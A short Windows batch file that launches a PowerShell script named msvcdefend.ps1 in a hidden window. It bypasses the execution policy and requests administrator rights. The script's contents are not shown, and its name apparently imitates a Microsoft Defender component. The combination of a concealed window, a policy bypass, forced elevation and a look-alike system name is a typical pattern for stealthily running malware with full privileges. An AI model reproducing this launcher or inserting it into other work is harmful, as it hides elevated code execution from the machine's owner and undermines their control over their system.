@echo off
PowerShell -Command "Start-Process PowerShell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File \"%~dp0msvcdefend.ps1\"' -Verb RunAs"
